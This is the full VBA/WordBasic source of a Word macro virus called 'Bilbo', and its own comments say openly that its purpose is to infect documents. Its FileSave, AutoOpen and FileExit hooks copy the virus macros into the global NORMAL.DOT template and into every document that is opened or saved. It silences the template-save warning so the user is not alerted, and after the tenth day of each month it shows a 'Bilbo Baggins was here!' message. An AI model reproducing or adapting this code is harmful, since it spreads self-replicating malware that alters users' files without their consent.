   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSave"

   '
   ' MACRO: FileSave
   ' PURPOSE: Infect document when it saved
   '
   '
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   Dim X
   On Error GoTo -1: On Error GoTo NoSave

   WordBasic.DisableAutoMacros 0             ' Reenable auto macros processing

   ' Infect document
   X = WordBasic.Call("Bilbo.CopyMacros", WordBasic.[FileName$]())

   ' Convert document into template
   WordBasic.FileSaveAs Format:=1

   NoSave:
   End Sub

   Attribute VB_Name = "FileExit"

   '
   ' MACRO: FileExit
   ' PURPOSE: Display message when exit form word
   '
   '
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
   On Error GoTo -1: On Error GoTo NoExit

   ' Check conditions
   If WordBasic.Day(WordBasic.Now()) > 10 Then
      ' Display message
      WordBasic.MsgBox "Bilbo Baggins was here!"
   End If

   WordBasic.FileExit

   NoExit:
   End Sub

   Attribute VB_Name = "AutoOpen"

   '
   ' MACRO: AutoOpen
   ' PURPOSE: Infect Document or Global template.
   '
   '
   Public Sub MAIN()
   Dim X
   On Error GoTo -1: On Error GoTo NoAuto
   ' Infect document
      X = WordBasic.Call("Bilbo.CopyMacros", WordBasic.[FileName$]())
   NoAuto:
   End Sub

   Attribute VB_Name = "AutoExec"

   '
   ' MACRO: AutoExec
   ' PURPOSE: Remove some AV stuff (something like as DisableAutoMacros)
   '
   '
   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "Bilbo1"

   '
   ' MACRO: Bilbo
   ' PURPOSE: Main macro.
   '
   '
   Public Sub MAIN()
   End Sub

   Private Function CopyMacros(Name_$)
   Dim I
   Dim X
   Dim Here
   Dim we
   Dim infect
   Dim global_
   Dim template
   Dim active

   Dim GlobalPresent
   Dim ActivePresent

   CopyMacros = 0

   GlobalPresent = 0
   ActivePresent = 0

   ' Disable NORMAL.DOT write access warnings
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   ' Check If we in Global template
   For I = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](I, 0) = "Bilbo" Then
      GlobalPresent = 1    ' Allready infected
   End If
   Next I

   ' Check if document allready infected
   X = WordBasic.CountMacros(1)
   If (X = 0) Then GoTo SkipActiveCheck

   For I = 1 To WordBasic.CountMacros(1)
   If WordBasic.[MacroName$](I, 1) = "Bilbo" Then
      ActivePresent = 1    ' Allready infected
   End If
   Next I

   SkipActiveCheck:

   Here we infect global_ template Or active template

   If GlobalPresent = 0 Then

      WordBasic.MacroCopy Name_$ + ":FileOpen", "FileOpen", 1
      WordBasic.MacroCopy Name_$ + ":FileSave", "FileSave", 1
      WordBasic.MacroCopy Name_$ + ":FileExit", "FileExit", 1
      WordBasic.MacroCopy Name_$ + ":AutoOpen", "AutoOpen", 1
      WordBasic.MacroCopy Name_$ + ":AutoExec", "AutoExec", 1
      WordBasic.MacroCopy Name_$ + ":Bilbo", "Bilbo", 1

   End If

   If ActivePresent = 0 Then

      CopyMacros = 1
      WordBasic.MacroCopy "FileOpen", Name_$ + ":FileOpen", 1
      WordBasic.MacroCopy "FileSave", Name_$ + ":FileSave", 1
      WordBasic.MacroCopy "FileExit", Name_$ + ":FileExit", 1
      WordBasic.MacroCopy "AutoOpen", Name_$ + ":AutoOpen", 1
      WordBasic.MacroCopy "AutoExec", Name_$ + ":AutoExec", 1
      WordBasic.MacroCopy "Bilbo", Name_$ + ":Bilbo", 1

   End If
   End Function
